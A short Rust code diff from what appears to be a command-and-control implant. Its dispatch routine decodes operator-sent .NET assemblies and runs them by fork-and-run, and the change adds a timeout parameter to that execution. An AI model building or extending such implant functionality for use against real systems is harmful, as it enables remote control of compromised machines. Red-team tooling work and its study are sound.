@@ -1677,7 +1677,8 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
                 Err(e) => { t.send_result(task.id, "", &format!("b64 decode: {}", e)); return; }
             };
             let asm_args = j.get("args").and_then(|v| v.as_str()).unwrap_or("").to_string();
-            let r = crate::dotnet::fork_run_assembly(&asm_bytes, &asm_args);
+            let timeout_sec = j.get("timeout_sec").and_then(|v| v.as_u64()).unwrap_or(0);
+            let r = crate::dotnet::fork_run_assembly(&asm_bytes, &asm_args, timeout_sec);
             t.send_result(task.id, &r, "");
         }
         #[cfg(target_os = "windows")]
